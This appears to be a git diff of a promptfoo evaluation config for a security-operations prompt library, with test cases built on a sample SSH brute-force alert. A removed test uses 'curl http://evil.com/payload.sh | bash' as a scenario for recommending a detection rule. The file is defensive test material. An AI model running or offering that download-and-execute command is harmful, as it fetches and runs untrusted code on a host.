@@ -1,26 +1,13 @@
-# yaml-language-server: $schema=https://promptfoo.dev/config-schema.json
-description: AI Gateway SOC prompt library evaluation (tinyllama)
-
-# Sequential requests with a short pause — keeps CPU load low on the 2 vCPU VPS.
-evaluateOptions:
-  maxConcurrency: 1
-  delay: 2000
+description: "AI Security Engineering Platform - Prompt Library Evaluation"
 
 prompts:
-  - id: "{{input}}"
-    label: generic-soc
-  - file://../prompts/alert_summary.md
-    label: alert_summary
-  - file://../prompts/mitre_mapping.md
-    label: mitre_mapping
-  - file://../prompts/detection_recommendation.md
-    label: detection_recommendation
-  - file://../prompts/executive_summary.md
-    label: executive_summary
+  - file:///prompts/alert_summary.md
+  - file:///prompts/mitre_mapping.md
+  - file:///prompts/detection_recommendation.md
+  - file:///prompts/executive_summary.md
 
 providers:
-  - id: http://nginx/gateway/chat
-    label: ai-gateway-tinyllama
+  - id: http://ai-gateway:8000/chat
     config:
       method: POST
       headers:
@@ -28,199 +15,41 @@ providers:
       body:
         model: tinyllama
         prompt: "{{prompt}}"
-      transformResponse: json.response
+      transformResponse: "json.response"
+
+evaluateOptions:
+  maxConcurrency: 1
 
 tests:
-  # --- Generic SOC smoke tests (legacy) ---
-  - description: SOC alert summary — failed SSH authentication
-    prompts:
-      - generic-soc
-    vars:
-      input: |
-        Summarize this SOC alert in 3 short bullets:
-        Rule 5710 level 8: Failed password for root from 192.168.1.50 via ssh on ubuntu-agent.
-    assert:
-      - type: icontains-any
-        value:
-          - ssh
-          - authentication
-          - failed
-          - root
-          - login
-          - password
-
-  - description: Suspicious SSH login explanation
-    prompts:
-      - generic-soc
-    vars:
-      input: |
-        Explain in 2 sentences why this SSH activity is suspicious:
-        Successful login for admin from 203.0.113.99 at 03:14 UTC; user normally works 09:00-17:00 EST from 198.51.100.10.
-    assert:
-      - type: icontains-any
-        value:
-          - suspicious
-          - unusual
-          - anomaly
-          - off-hours
-          - time
-          - ip
-
-  - description: Detection engineering recommendation — curl pipe bash
-    prompts:
-      - generic-soc
-    vars:
-      input: |
-        Recommend one Sigma-style detection for this scenario in 2 bullets:
-        User sysadmin ran: curl http://evil.com/payload.sh | bash on linux host ubuntu-agent.
-    assert:
-      - type: icontains-any
-        value:
-          - detect
-          - rule
-          - curl
-          - bash
-          - command
-          - pipe
-          - sigma
-
-  # --- Prompt library: alert_summary.md ---
-  - description: alert_summary — Wazuh SSH auth failure (sample_data/wazuh_alert.json)
-    prompts:
-      - alert_summary
-    vars:
+  - vars:
       alert_data: |
-        {"timestamp":"2026-05-22T18:30:00Z","rule":{"id":"5710","level":8,"description":"sshd: authentication failed"},"agent":{"id":"001","name":"ubuntu-agent"},"srcip":"192.168.1.50","user":"root","decoder":{"name":"sshd"},"full_log":"Failed password for root from 192.168.1.50 port 54422 ssh2"}
-      investigation_context: ""
-    assert:
-      - type: icontains-any
-        value:
-          - template_id
-          - observations
-          - assumptions
-          - summary
-          - recommended_next_steps
-      - type: icontains-any
-        value:
-          - root
-          - 192.168.1.50
-          - ubuntu-agent
-          - "5710"
-      - type: icontains-any
-        value:
-          - ssh
-          - authentication
-          - failed
-          - password
-      - type: javascript
-        value: |
-          const t = output.trim().replace(/^```(?:json)?\s*/i, '').replace(/```\s*$/, '');
-          try {
-            const j = JSON.parse(t);
-            return Array.isArray(j.observations) || typeof j.summary === 'string';
-          } catch {
-            return /"observations"|"summary"|"assumptions"/.test(t);
-          }
-
-  # --- Prompt library: mitre_mapping.md ---
-  - description: mitre_mapping — SSH brute-force activity from Wazuh alert
-    prompts:
-      - mitre_mapping
-    vars:
-      activity_description: |
-        Wazuh rule 5710 (level 8): sshd authentication failed on ubuntu-agent.
-        User root, source IP 192.168.1.50. Log: Failed password for root from 192.168.1.50 port 54422 ssh2.
-      platform_context: Linux
-      existing_mitre_hints: ""
-    assert:
-      - type: icontains-any
-        value:
-          - template_id
-          - confirmed_mappings
-          - observations
-          - hypothesis_mappings
-      - type: icontains-any
-        value:
-          - T1110
-          - brute
-          - credential
-          - password
-          - ssh
-      - type: javascript
-        value: |
-          const t = output.trim().replace(/^```(?:json)?\s*/i, '').replace(/```\s*$/, '');
-          try {
-            const j = JSON.parse(t);
-            return Array.isArray(j.confirmed_mappings) || Array.isArray(j.observations);
-          } catch {
-            return /"confirmed_mappings"|"technique_id"|"observations"/.test(t);
-          }
-
-  # --- Prompt library: detection_recommendation.md ---
-  - description: detection_recommendation — SSH auth failure investigation findings
-    prompts:
-      - detection_recommendation
-    vars:
-      investigation_findings: |
-        Failed SSH password attempts for root from 192.168.1.50 against ubuntu-agent (Wazuh rule 5710, level 8).
-        Decoder sshd. No successful login observed in provided telemetry.
-      alert_type: ssh_auth_failure
-      environment_constraints: Wazuh SIEM, Linux auth logs on ubuntu-agent
-      mitre_techniques: T1110
-    assert:
-      - type: icontains-any
-        value:
-          - template_id
-          - detection_gaps
-          - recommended_detections
-          - false_positive
-      - type: icontains-any
-        value:
-          - ssh
-          - authentication
-          - detect
-          - rule
-          - root
-          - 192.168.1.50
-      - type: javascript
-        value: |
-          const t = output.trim().replace(/^```(?:json)?\s*/i, '').replace(/```\s*$/, '');
-          try {
-            const j = JSON.parse(t);
-            return Array.isArray(j.recommended_detections) || Array.isArray(j.detection_gaps);
-          } catch {
-            return /"recommended_detections"|"detection_gaps"|"rule_draft"/.test(t);
-          }
-
-  # --- Prompt library: executive_summary.md ---
-  - description: executive_summary — SSH auth failure investigation package
-    prompts:
-      - executive_summary
-    vars:
+        {
+          "source_ip": "192.168.1.50",
+          "destination_host": "ubuntu-agent",
+          "event_type": "ssh_failed_login",
+          "username": "root",
+          "failure_count": 15,
+          "time_window": "10 minutes",
+          "severity": "medium"
+        }
+      investigation_context: "Repeated SSH authentication failures against a Linux host."
+      activity_description: "Repeated SSH authentication failures from 192.168.1.50 against ubuntu-agent targeting root, 15 failures in 10 minutes."
+      investigation_findings: "SSH brute-force style activity: source 192.168.1.50, host ubuntu-agent, user root, 15 failed logins in 10 minutes, medium severity."
       investigation_package: |
-        {"alert_type":"ssh_auth_failure","host":"ubuntu-agent","user":"root","source_ip":"192.168.1.50","rule_id":"5710","severity_level":8,"timestamp":"2026-05-22T18:30:00Z","status":"under_investigation","summary":"Failed SSH login attempts for root from 192.168.1.50; no compromise confirmed."}
-      audience: executive leadership
-      business_context: ""
+        {
+          "summary": "Repeated SSH authentication failures against ubuntu-agent",
+          "source_ip": "192.168.1.50",
+          "destination_host": "ubuntu-agent",
+          "username": "root",
+          "failure_count": 15,
+          "time_window": "10 minutes",
+          "severity": "medium",
+          "status": "under_investigation"
+        }
     assert:
-      - type: icontains-any
-        value:
-          - template_id
-          - executive_summary
-          - key_facts
-          - incident_status
-          - impact_assessment
-      - type: icontains-any
-        value:
-          - ssh
-          - root
-          - ubuntu-agent
-          - investigation
+      - type: not-contains
+        value: "I cannot"
+      - type: not-contains
+        value: "I'm unable"
       - type: javascript
-        value: |
-          const t = output.trim().replace(/^```(?:json)?\s*/i, '').replace(/```\s*$/, '');
-          try {
-            const j = JSON.parse(t);
-            return typeof j.executive_summary === 'string' || Array.isArray(j.key_facts);
-          } catch {
-            return /"executive_summary"|"key_facts"|"incident_status"/.test(t);
-          }
+        value: "output.length > 50"
